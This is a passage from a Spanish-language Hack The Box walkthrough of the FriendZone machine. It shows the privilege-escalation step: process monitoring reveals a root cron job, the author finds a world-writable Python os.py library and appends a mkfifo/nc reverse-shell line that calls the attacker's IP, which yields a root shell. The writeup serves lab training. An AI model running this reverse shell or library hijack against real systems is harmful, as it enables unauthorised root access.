2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>115    | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>11197  | bash 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>11187  | <span class="o">(</span>sd-pam<span class="o">)</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>11186  | /lib/systemd/systemd <span class="nt">--user</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11185  | su friend 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>11180  | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11164  | bash 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11163  | sh <span class="nt">-c</span> bash 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11162  | script /dev/null <span class="nt">-c</span> bash 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11158  | nc 10.10.14.27 443 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11157  | /bin/sh <span class="nt">-i</span> 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11156  | <span class="nb">cat</span> /tmp/f 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11153  | sh <span class="nt">-c</span> <span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.27 443 <span class="o">&gt;</span>/tmp/
f 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11152  | /usr/sbin/apache2 <span class="nt">-k</span> start 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11151  | /usr/sbin/apache2 <span class="nt">-k</span> start 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11150  | /usr/sbin/apache2 <span class="nt">-k</span> start 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11149  | /usr/sbin/apache2 <span class="nt">-k</span> start 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11148  | /usr/sbin/apache2 <span class="nt">-k</span> start 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11147  | /usr/sbin/apache2 <span class="nt">-k</span> start 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>11140  | /usr/sbin/apache2 <span class="nt">-k</span> start 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>11     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>10716  | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>33   <span class="nv">PID</span><span class="o">=</span>10715  | script /dev/null <span class="nt">-c</span> bash 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>10     | 
2021/12/07 06:52:05 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1      | /sbin/init splash
2021/12/07 06:54:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>44095  | /usr/bin/python /opt/server_admin/reporter.py 
2021/12/07 06:54:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>44094  | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
2021/12/07 06:54:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>44093  | /usr/sbin/CRON <span class="nt">-f</span> 
2021/12/07 06:56:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>44098  | /usr/bin/python /opt/server_admin/reporter.py 
2021/12/07 06:56:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>44097  | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
2021/12/07 06:56:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>44096  | /usr/sbin/CRON <span class="nt">-f</span> 
</code></pre></div></div>

<p>Se observa que se ejecuta el programa en python <code class="language-plaintext highlighter-rouge">/opt/server_admin/reporter.py</code> y quien lo ejecuta es el usuario <strong>root</strong> (UID=0).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
drwxr-xr-x 2 root root 4096 Jan 24  2019 server_admin
friend@FriendZone:/opt<span class="nv">$ </span><span class="nb">cd </span>server_admin
friend@FriendZone:/opt/server_admin<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
<span class="nt">-rwxr--r--</span> 1 root root 424 Jan 16  2019 reporter.py
friend@FriendZone:/opt/server_admin<span class="err">$</span>
</code></pre></div></div>

<p>Tenemos permisos de lectura dentro del directorio <code class="language-plaintext highlighter-rouge">server_admin</code> y sobre el recurso <code class="language-plaintext highlighter-rouge">reporter.py</code>; por lo que vamos a echarle un ojo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt/server_admin<span class="nv">$ </span><span class="nb">cat </span>reporter.py 
<span class="c">#!/usr/bin/python</span>

import os

to_address <span class="o">=</span> <span class="s2">"admin1@friendzone.com"</span>
from_address <span class="o">=</span> <span class="s2">"admin2@friendzone.com"</span>

print <span class="s2">"[+] Trying to send email to %s"</span>%to_address

<span class="c">#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''</span>

<span class="c">#os.system(command)</span>

<span class="c"># I need to edit the script later</span>
<span class="c"># Sam ~ python developer</span>
friend@FriendZone:/opt/server_admin<span class="err">$</span>
</code></pre></div></div>

<p>Del programa no vemos nada interesante, salvo que se importa la librería <code class="language-plaintext highlighter-rouge">os</code>, pero no tenemos permisos de escritura del programa ni bajo el directorio <code class="language-plaintext highlighter-rouge">server_admin</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt/server_admin<span class="nv">$ </span>python
Python 2.7.15rc1 <span class="o">(</span>default, Apr 15 2018, 21:51:34<span class="o">)</span> 
<span class="o">[</span>GCC 7.3.0] on linux2
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> import sys
<span class="o">&gt;&gt;&gt;</span> sys.path
<span class="o">[</span><span class="s1">''</span>, <span class="s1">'/usr/lib/python2.7'</span>, <span class="s1">'/usr/lib/python2.7/plat-x86_64-linux-gnu'</span>, <span class="s1">'/usr/lib/python2.7/lib-tk'</span>, <span class="s1">'/usr/lib/python2.7/lib-old'</span>, <span class="s1">'/usr/lib/python2.7/lib-dynload'</span>, <span class="s1">'/usr/local/lib/python2.7/dist-packages'</span>, <span class="s1">'/usr/lib/python2.7/dist-packages'</span><span class="o">]</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">exit</span><span class="o">()</span>
friend@FriendZone:/opt/server_admin<span class="err">$</span>
</code></pre></div></div>

<p>Por lo que no podemos hacer <strong><em>Library Hijacking</em></strong> creando un archivo llamado <code class="language-plaintext highlighter-rouge">os.py</code> dentro del directorio <code class="language-plaintext highlighter-rouge">server_admin</code>. Vemos que por default se utiliza python 2.7, así que vamos a echarle un ojo a la librería <code class="language-plaintext highlighter-rouge">os.py</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt/server_admin<span class="nv">$ </span>locate os.py
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py
friend@FriendZone:/opt/server_admin<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/lib/python2.7/os.py
<span class="nt">-rwxrwxrwx</span> 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
friend@FriendZone:/opt/server_admin<span class="err">$</span>
</code></pre></div></div>

<p>Tenemos permisos de escritura del recurso <code class="language-plaintext highlighter-rouge">/usr/lib/python2.7/os.py</code>, asi que podemos ejecutar comandos como el usuario <strong>root</strong>; para este caso, vamos a entablarnos una reverse shell. Al final del archivo <code class="language-plaintext highlighter-rouge">os.py</code> agregamos la siguiente linea:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">system</span><span class="p">(</span><span class="s">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.27 443 &gt;/tmp/f"</span><span class="p">)</span>
</code></pre></div></div>

<p>Nos ponemos en escucha por el puerto 443 y esperamos a que el usuario <strong>root</strong> ejecute el programa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.123] 42142
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# whoami
root
# 
</span></code></pre></div></div>

<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#dns-zone-transfer" class="page__taxonomy-item" rel="tag">DNS_Zone_Transfer</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">LFI</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-12-12T00:00:00-06:00">December 12, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-active/" class="pagination--pager" title="Hack The Box Active
">Previous</a>
    
    
      <a href="/htb-shocker/" class="pagination--pager" title="Hack The Box Shocker
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
